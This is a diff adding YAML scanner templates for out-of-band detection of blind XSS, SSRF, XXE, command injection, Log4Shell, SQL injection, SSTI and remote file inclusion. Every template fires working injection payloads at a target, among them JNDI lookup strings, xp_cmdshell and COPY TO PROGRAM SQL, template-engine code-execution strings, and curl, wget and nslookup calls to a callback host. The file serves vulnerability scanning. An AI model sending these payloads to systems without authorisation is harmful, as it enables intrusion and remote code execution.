@@ -1,0 +1,302 @@
+id: blind-xss-oob
+
+info:
+  name: Blind XSS - Out-of-Band Detection
+  author: ancarna
+  severity: high
+  description: Detects blind XSS vulnerabilities using OOB callbacks (requires OOB server)
+  tags: xss,blind,oob,stored-xss
+  classification:
+    cwe-id: 79
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/stored
+    - https://xsshunter.com/
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "<script src=\"{{interactsh}}\"></script>"
+        - "'><script src=\"{{interactsh}}\"></script>"
+        - "\"><script src=\"{{interactsh}}\"></script>"
+        - "<img src=x onerror=\"fetch('{{interactsh}}')\"/>"
+        - "<svg onload=\"fetch('{{interactsh}}')\"/>"
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'http'"
+
+---
+id: blind-ssrf-oob
+
+info:
+  name: Blind SSRF - Out-of-Band Detection
+  author: ancarna
+  severity: high
+  description: Detects blind SSRF vulnerabilities using OOB callbacks
+  tags: ssrf,blind,oob
+  classification:
+    cwe-id: 918
+  reference:
+    - https://portswigger.net/web-security/ssrf/blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "http://{{interactsh}}"
+        - "https://{{interactsh}}"
+        - "//{{interactsh}}"
+        - "http://{{interactsh}}:80/"
+        - "http://{{interactsh}}:443/"
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'http' || interactsh_protocol == 'dns'"
+
+---
+id: blind-xxe-oob
+
+info:
+  name: Blind XXE - Out-of-Band Detection
+  author: ancarna
+  severity: critical
+  description: Detects blind XXE vulnerabilities using OOB callbacks
+  tags: xxe,blind,oob
+  classification:
+    cwe-id: 611
+  reference:
+    - https://portswigger.net/web-security/xxe/blind
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://{{interactsh}}/">
+      ]>
+      <root>&xxe;</root>
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'http' || interactsh_protocol == 'dns'"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://{{interactsh}}/xxe.dtd">
+        %xxe;
+      ]>
+      <root>test</root>
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'http'"
+
+---
+id: blind-cmdi-oob
+
+info:
+  name: Blind Command Injection - Out-of-Band Detection
+  author: ancarna
+  severity: critical
+  description: Detects blind command injection using DNS/HTTP callbacks
+  tags: cmdi,rce,blind,oob
+  classification:
+    cwe-id: 78
+  reference:
+    - https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "; nslookup {{interactsh}}"
+        - "| nslookup {{interactsh}}"
+        - "|| nslookup {{interactsh}}"
+        - "& nslookup {{interactsh}}"
+        - "&& nslookup {{interactsh}}"
+        - "`nslookup {{interactsh}}`"
+        - "$(nslookup {{interactsh}})"
+        - "; curl http://{{interactsh}}"
+        - "| curl http://{{interactsh}}"
+        - "; wget http://{{interactsh}}"
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns' || interactsh_protocol == 'http'"
+
+---
+id: log4shell-oob
+
+info:
+  name: Log4Shell (CVE-2021-44228) - Out-of-Band Detection
+  author: ancarna
+  severity: critical
+  description: Detects Log4Shell vulnerability using JNDI callbacks
+  tags: log4j,log4shell,cve-2021-44228,rce,oob
+  classification:
+    cve-id: CVE-2021-44228
+    cwe-id: 502
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://logging.apache.org/log4j/2.x/security.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      X-Api-Version: "{{payload}}"
+      User-Agent: "{{payload}}"
+      Referer: "{{payload}}"
+      X-Forwarded-For: "{{payload}}"
+      Authentication: "{{payload}}"
+      Cookie: "session={{payload}}"
+    payloads:
+      payload:
+        - "${jndi:ldap://{{interactsh}}/a}"
+        - "${jndi:rmi://{{interactsh}}/a}"
+        - "${jndi:dns://{{interactsh}}}"
+        - "${${lower:j}ndi:ldap://{{interactsh}}/a}"
+        - "${${upper:j}ndi:ldap://{{interactsh}}/a}"
+        - "${${::-j}${::-n}${::-d}${::-i}:ldap://{{interactsh}}/a}"
+        - "${j${:}ndi:ldap://{{interactsh}}/a}"
+        - "${jndi:${lower:l}${lower:d}a${lower:p}://{{interactsh}}/a}"
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns' || interactsh_protocol == 'ldap'"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"username":"${jndi:ldap://{{interactsh}}/a}","password":"test"}
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns' || interactsh_protocol == 'ldap'"
+
+---
+id: blind-sqli-oob
+
+info:
+  name: Blind SQL Injection - Out-of-Band Detection
+  author: ancarna
+  severity: high
+  description: Detects blind SQL injection using DNS/HTTP exfiltration
+  tags: sqli,blind,oob
+  classification:
+    cwe-id: 89
+  reference:
+    - https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # MSSQL - xp_dirtree
+        - "'; EXEC master..xp_dirtree '\\\\{{interactsh}}\\a'--"
+        - "\"; EXEC master..xp_dirtree '\\\\{{interactsh}}\\a'--"
+        # MSSQL - xp_cmdshell
+        - "'; EXEC xp_cmdshell 'nslookup {{interactsh}}'--"
+        # Oracle - UTL_HTTP
+        - "' || UTL_HTTP.REQUEST('http://{{interactsh}}/') || '"
+        # Oracle - UTL_INADDR
+        - "' || UTL_INADDR.GET_HOST_ADDRESS('{{interactsh}}') || '"
+        # PostgreSQL - COPY
+        - "'; COPY (SELECT '') TO PROGRAM 'nslookup {{interactsh}}'--"
+        # MySQL - LOAD_FILE with UNC (Windows)
+        - "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{{interactsh}}\\\\a'))--"
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns' || interactsh_protocol == 'http'"
+
+---
+id: blind-ssti-oob
+
+info:
+  name: Blind SSTI - Out-of-Band Detection
+  author: ancarna
+  severity: critical
+  description: Detects blind SSTI using command execution callbacks
+  tags: ssti,blind,oob,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Jinja2
+        - "{{config.__class__.__init__.__globals__['os'].popen('nslookup {{interactsh}}').read()}}"
+        - "{{''.__class__.__mro__[1].__subclasses__()[287]('nslookup {{interactsh}}',shell=True,stdout=-1).communicate()}}"
+        # Twig
+        - "{{['nslookup {{interactsh}}']|filter('system')}}"
+        # Freemarker
+        - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup {{interactsh}}\")}"
+        # ERB
+        - "<%= `nslookup {{interactsh}}` %>"
+        # Velocity
+        - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('nslookup {{interactsh}}'))"
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'dns'"
+
+---
+id: blind-rfi-oob
+
+info:
+  name: Remote File Inclusion - Out-of-Band Detection
+  author: ancarna
+  severity: critical
+  description: Detects RFI vulnerabilities using HTTP callbacks
+  tags: rfi,lfi,oob
+  classification:
+    cwe-id: 98
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "http://{{interactsh}}/shell.txt"
+        - "http://{{interactsh}}/shell.php"
+        - "http://{{interactsh}}/shell"
+        - "//{{interactsh}}/shell"
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "interactsh_protocol == 'http'"
